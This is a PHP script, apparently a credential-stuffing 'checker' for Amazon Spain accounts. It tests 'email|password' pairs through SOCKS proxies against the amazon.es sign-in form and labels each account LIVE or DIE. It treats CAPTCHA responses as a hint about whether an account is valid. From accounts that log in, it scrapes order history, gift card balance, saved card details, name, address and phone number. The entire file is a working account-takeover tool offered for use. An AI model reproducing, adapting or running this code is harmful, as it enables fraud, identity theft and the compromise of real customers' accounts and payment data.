<?php
session_start();
error_reporting(0);
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$sock = $_POST['sock'];
$hasil = array();

if (!isset($format)) {
header('location: ./');
exit;
}
require 'class_curl.php';
if (isset($format)){
	
	// cek wrong
	if ($pisah[1] == '' || $pisah[1] == null) {
		die('{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | Unable to checking"}');
	}
	

    $curl = new curl();
    $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
	$curl->ssl(0, 2);
    if ($sock != "127.0.0.1:8080") {
    $curl->socks($sock);
    }
	$curl->timeout(10);
	
	$url_get  = "https://www.amazon.es/gp/navigation/redirector.html/ref=sign-in-redirect?ie=UTF8&associationHandle=esflex&currentPageURL=https%3A%2F%2Fwww.amazon.es%2F%3F_encoding%3DUTF8%26ref_%3Dnav_ya_signin&pageType=Gateway&yshURL=https%3A%2F%2Fwww.amazon.es%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_ya_signin";
	$page = $curl->get($url_get);
	
	if ($page) {
		
		$cookies = fetchCurlCookies($page);
		
		//Get Data
		$appactiontoken = get_string($page,'<input type="hidden" name="appActionToken" value="','"');
		$maxauth        = get_string($page,'<input type="hidden" name="openid.pape.max_auth_age" value="','"');
		$returnto       = get_string($page,'<input type="hidden" name="openid.return_to" value="','"');
		$prevrid        = get_string($page,'<input type="hidden" name="prevRID" value="','"');
		$identity       = get_string($page,'<input type="hidden" name="openid.identity" value="','"');
		$assochandle    = get_string($page,'<input type="hidden" name="openid.assoc_handle" value="','"');
		$mode           = get_string($page,'<input type="hidden" name="openid.mode" value="','"');
		$nspape         = get_string($page,'<input type="hidden" name="openid.ns.pape" value="','"');
		$claimedid      = get_string($page,'<input type="hidden" name="openid.claimed_id" value="','"');
		$pageid         = get_string($page,'<input type="hidden" name="pageId" value="','"');
		$opendidns      = get_string($page,'<input type="hidden" name="openid.ns" value="','"');

		
		$url_post = "https://www.amazon.es/ap/signin";
		$data = "appActionToken={$appactiontoken}&appAction=SIGNIN&openid.pape.max_auth_age={$maxauth}&openid.return_to={$returnto}&prevRID={$prevrid}&openid.identity={$identity}&openid.assoc_handle={$assochandle}&openid.mode={$mode}&openid.ns.pape={$nspape}&openid.claimed_id={$claimedid}&pageId={$pageid}&openid.ns={$opendidns}&email={$pisah[0]}&create=0&password={$pisah[1]}&metadata1=";
		$header = array(
              'Host: www.amazon.es',
              'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
              'Accept-Language: en-US,en;q=0.5',
              'Referer: https://www.amazon.es/gp/navigation/redirector.html/ref=sign-in-redirect?ie=UTF8&associationHandle=esflex&currentPageURL=https%3A%2F%2Fwww.amazon.es%2F%3F_encoding%3DUTF8%26ref_%3Dnav_ya_signin&pageType=Gateway&yshURL=https%3A%2F%2Fwww.amazon.es%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_ya_signin',
              'Connection: keep-alive',
              'Content-Type: application/x-www-form-urlencoded',
              );
		$curl->header($header);
		$page = $curl->post($url_post, $data);
		
		if ($page == null) {
			die('{"error": 3, "msg": "'.$sock.' | No Response"}');
		}
		
		
		if (inStr($page, "La contraseña no es correcta")) {
			$result['error'] = 2;
			$result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
			$curl->close();
			die(json_encode($result));
		} else if (inStr($page, "No encontramos ninguna cuenta con esa dirección de correo electrónico")) {
			$result['error'] = 2;
			$result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
			$curl->close();
			die(json_encode($result));
		} else if (inStr($page, "Error interno. Inténtalo otra vez más tarde.")) {
			$result['error'] = 2;
			$result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
			$curl->close();
			die(json_encode($result));
		} else if (inStr($page, "Error interno. Inténtalo otra vez más tarde.")) {
			$result['error'] = 2;
			$result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
			$curl->close();
			die(json_encode($result));
		} else if (inStr($page, "Es necesario restablecer la contraseña")) {
			$result['error'] = 2;
			$result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
			$curl->close();
			die(json_encode($result));
		} else if (inStr($page, "Verificación de inicio de sesión")) {
			$result['error'] = 2;
			$result['msg'] = '<b style="color:red;">DIE</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1];
			$curl->close();
			die(json_encode($result));
		} else if (inStr($page, "Para proteger mejor su cuenta")) {
			if (isset($_SESSION['captcha_'.$pisah[0]])) {
				if ($_SESSION['captcha_'.$pisah[0]] > rand(1,3)) {
					$result['error'] = 2;
					$result['msg'] = '<b style="color:red;">CAPTCHA</b> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | Can meaning this acc is valid/not valid';
				unset($_SESSION['captcha_'.$pisah[0]]);
				$curl->close();
				die(json_encode($result));
			}
				$_SESSION['captcha_'.$pisah[0]] = $_SESSION['captcha_'.$pisah[0]] + 1;
			} else {
				$_SESSION['captcha_'.$pisah[0]] = 1;
			}
				$result['error'] = 3;
				$result['msg'] = '<font color=red>'.$sock.'</font> | Captcha Detected';
				$curl->close();
				die(json_encode($result));
		} else if (inStr($page, "Preguntas de seguridad")) {
			$result['error'] = 0;
			$result['msg'] = '<font color=green><b>LIVE</b></font> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | <font color=red>Security Questions</font>';
			$curl->close();
			die(json_encode($result));
		} else if (inStr($page, "yourstore/home")) {
			
		
            $page_order = $curl->get("https://www.amazon.es/gp/css/order-history/ref=orders");
            $info['order'] = (inStr($page_order, "No has realizado ningún pedido") ? '<font color=red>No Order</font>' : '<font color=blue>Last Order(s): '.get_string($page_order,'<span class="num-orders">','</span>').'</font>');
			
            $page_balance = $curl->get("https://www.amazon.es/gp/css/gc/balance?ref_=ya_d_c_gc");
			$gc1 = get_string($page_balance,'<td class="gcBalance">','</br>');
			$gc2 = get_string($gc1,'<span>','</span>');
            $gc = (empty($gc2) ? "<font color=red>Can't Grab</font>" : "<font color=green>$gc2</font>");
            $info['gc'] = 'Giftcards: '.$gc;
			
			$page_card    = $curl->get("https://www.amazon.es/gp/css/account/cards/view.html?ie=UTF8&ref_=ya_29&");
			preg_match_all('/inline; font-weight: normal">(.*)<\/h2><\/td>/i', $page_card, $type);
			preg_match_all('/<b>Número:<\/b><\/td><td>(.*)/i', $page_card, $ccn);
			preg_match_all('/Fecha de vencimiento:<\/b><\/td><td>(.*)<\/td><\/tr>/i', $page_card, $ccexp);
			$totalcc = count($type[1]);
			$i = 0;
			while($i < $totalcc) {
				$num = get_string($ccn[1][$i],'************','</td></tr>');
				$exp = explode("</td></tr>",$ccexp[1][$i]);
				$cc .= "[".$type[1][$i]." - x".$num." - ".$exp[0]."] ";
				$i++;
			}
			$amazon_card = ($totalcc == 0 ? "<font color=red>No Card</font>" : "Total Card(s): ".$totalcc." <font color=blue>".$cc."</font>");
			
			$page_address = $curl->get('https://www.amazon.es/a/addresses?ref_=ya_d_c_addr');
            $get_address = get_string($page_address,'<ul class="a-unordered-list a-nostyle a-vertical">','</ul>');
            $address = array();
            $address['name'] = get_string($page_address,'<h5 id="address-ui-widgets-FullName" class="id-addr-ux-search-text aok-inline-block a-text-bold">','</h5>');
            $address['address1'] = get_string($page_address,'<span id="address-ui-widgets-AddressLineOne" class="id-addr-ux-search-text">','</span>');
            $address['zip'] = get_string($page_address,'<span id="address-ui-widgets-CityStatePostalCode" class="id-addr-ux-search-text">','</span>');
            $address['country'] = get_string($page_address,'<span id="address-ui-widgets-Country" class="id-addr-ux-search-text">','</span>');
            $address['phone'] = get_string($page_address,'<span id="address-ui-widgets-PhoneNumber" class="id-addr-ux-search-text">Número de teléfono: ','</span>');
            $address = ($address['address1'] == null) ? "No Address" : implode(" - ",$address);
			
			$result['error'] = 0;
			$result['msg'] = '<font color=green><b>LIVE</b></font> | '.$sock.' | '.$pisah[0].' | '.$pisah[1].' | '.$info['order'].' | '.$info['gc'].' | '.$amazon_card.' | '.$address.'';
			$curl->close();
			die(json_encode($result));
		} else {
		  $c0de = $curl->http_code();
          $result['error'] = 3;
          $result['msg'] = $sock.' | Error Code: '.$c0de.'';
		  $curl->close();
          die(json_encode($result));
        }
    } else {
          $resError = $curl->error();
          $result['error'] = 3;
          $result['msg'] = $sock.' | Socks Die';
		  $curl->close();
          die(json_encode($result));
    }
}
?>